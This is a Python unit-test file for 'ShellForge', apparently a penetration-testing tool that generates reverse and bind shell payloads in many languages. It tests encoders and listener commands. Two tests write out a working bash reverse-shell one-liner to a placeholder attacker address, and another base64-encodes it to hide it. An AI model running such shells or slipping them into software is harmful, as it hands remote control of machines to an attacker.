"""
Unit tests for ShellForge payload generators.

Author: Mostafa Tamime
"""

from __future__ import annotations

import importlib
import sys
from pathlib import Path

import pytest

# Ensure project root is on sys.path
ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from encoders.encode import (  # noqa: E402
    apply_encoding,
    encode_base64,
    encode_ps_encoded,
    encode_url,
)
from generators.awk import AwkGenerator  # noqa: E402
from generators.bash_sh import BashFifoGenerator, BashGenerator  # noqa: E402
from generators.c_lang import CGenerator  # noqa: E402
from generators.csharp import CsharpGenerator  # noqa: E402
from generators.golang import GolangGenerator  # noqa: E402
from generators.java_lang import JavaGenerator  # noqa: E402
from generators.lua import LuaGenerator  # noqa: E402
from generators.netcat import NetcatGenerator, NetcatMkfifoGenerator  # noqa: E402
from generators.perl_lang import PerlGenerator  # noqa: E402
from generators.php_lang import PhpGenerator  # noqa: E402
from generators.python_lang import Python3Generator, PythonGenerator  # noqa: E402
from generators.ruby_lang import RubyGenerator  # noqa: E402
from generators.socat import SocatGenerator  # noqa: E402
from listeners.listener_helper import listener_commands  # noqa: E402

IP = "10.10.14.5"
PORT = 4444

GENERATORS = [
    ("bash", BashGenerator()),
    ("bash-fifo", BashFifoGenerator()),
    ("python", PythonGenerator()),
    ("python3", Python3Generator()),
    ("perl", PerlGenerator()),
    ("php", PhpGenerator()),
    ("ruby", RubyGenerator()),
    ("nc", NetcatGenerator()),
    ("nc-mkfifo", NetcatMkfifoGenerator()),
    ("socat", SocatGenerator()),
    ("java", JavaGenerator()),
    ("csharp", CsharpGenerator()),
    ("c", CGenerator()),
    ("golang", GolangGenerator()),
    ("lua", LuaGenerator()),
    ("awk", AwkGenerator()),
]


def _maybe_powershell():
    try:
        mod = importlib.import_module("generators.powershell")
        return ("powershell", mod.PowershellGenerator())
    except ImportError:
        return None


_ps = _maybe_powershell()
if _ps:
    GENERATORS.append(_ps)


@pytest.mark.parametrize("name,gen", GENERATORS, ids=[g[0] for g in GENERATORS])
def test_reverse_contains_ip_and_port(name: str, gen) -> None:
    payload = gen.reverse(IP, PORT)
    assert isinstance(payload, str)
    assert payload.strip() != ""
    assert IP in payload
    assert str(PORT) in payload


@pytest.mark.parametrize("name,gen", GENERATORS, ids=[g[0] for g in GENERATORS])
def test_bind_contains_port(name: str, gen) -> None:
    payload = gen.bind(PORT)
    assert isinstance(payload, str)
    assert payload.strip() != ""
    assert str(PORT) in payload


@pytest.mark.parametrize("name,gen", GENERATORS, ids=[g[0] for g in GENERATORS])
def test_file_extension(name: str, gen) -> None:
    ext = gen.file_extension()
    assert isinstance(ext, str)
    assert ext.startswith(".")


def test_powershell_script_methods() -> None:
    ps = _maybe_powershell()
    if ps is None:
        pytest.skip("powershell generator not available")
    _, gen = ps
    rev = gen.reverse_script(IP, PORT)
    bind = gen.bind_script(PORT)
    assert IP in rev and str(PORT) in rev
    assert str(PORT) in bind


def test_c_script_methods() -> None:
    gen = CGenerator()
    rev = gen.reverse_script(IP, PORT)
    bind = gen.bind_script(PORT)
    assert "inet_addr" in rev
    assert IP in rev and str(PORT) in rev
    assert str(PORT) in bind
    assert "INADDR_ANY" in bind


def test_java_script_methods() -> None:
    gen = JavaGenerator()
    rev = gen.reverse_script(IP, PORT)
    bind = gen.bind_script(PORT)
    assert "ProcessBuilder" in rev
    assert IP in rev and str(PORT) in rev
    assert "ServerSocket" in bind
    assert str(PORT) in bind


def test_encode_base64() -> None:
    raw = f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
    encoded = encode_base64(raw)
    assert encoded
    assert IP not in encoded  # obfuscated form
    import base64

    assert base64.b64decode(encoded).decode() == raw


def test_encode_url() -> None:
    raw = f"test {IP}:{PORT}"
    encoded = encode_url(raw)
    assert "%3A" in encoded or ":" not in encoded or encoded != raw
    assert apply_encoding(raw, "urlencode") == encoded


def test_encode_ps_encoded() -> None:
    raw = "Write-Host hello"
    result = encode_ps_encoded(raw)
    assert result.startswith("powershell -EncodedCommand ")
    assert apply_encoding(raw, "ps-encoded") == result


def test_encode_none() -> None:
    raw = "payload"
    assert apply_encoding(raw, "none") == raw


def test_listener_commands() -> None:
    text = listener_commands(PORT, shell_type="reverse", ip=IP)
    assert f"nc -lvnp {PORT}" in text
    assert f"rlwrap nc -lvnp {PORT}" in text
    assert f"tcp-listen:{PORT}" in text
    assert "multi/handler" in text
    assert str(PORT) in text


def test_print_payload_is_copy_safe(capsys) -> None:
    """Payload must be plain text — no box-drawing characters."""
    import shellforge as sf

    payload = f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
    sf._print_payload("REVERSE | bash", payload)
    out = capsys.readouterr().out
    assert payload in out
    for ch in "┌┐└┘│─╔╗╚╝║":
        assert ch not in out
    assert "Payload (copy the line below):" in out


def test_interactive_ip_port_validation() -> None:
    from interactive import validate_ip, validate_port

    assert validate_ip("10.10.14.5")
    assert validate_ip("127.0.0.1")
    assert not validate_ip("")
    assert not validate_ip("999.1.1.1")
    assert validate_port("4444") == 4444
    assert validate_port("0") is None
    assert validate_port("65536") is None
    assert validate_port("abc") is None


def test_main_empty_argv_starts_interactive(monkeypatch) -> None:
    """No CLI args should enter interactive mode."""
    import shellforge as sf

    called = {}

    def fake_interactive(*, show_banner=True, sf=None):
        called["ok"] = True
        called["banner"] = show_banner
        return 0

    monkeypatch.setattr("interactive.run_interactive", fake_interactive)
    # Also patch where main imports it from
    import interactive as interactive_mod

    monkeypatch.setattr(interactive_mod, "run_interactive", fake_interactive)

    rc = sf.main([])
    assert rc == 0
    assert called.get("ok") is True
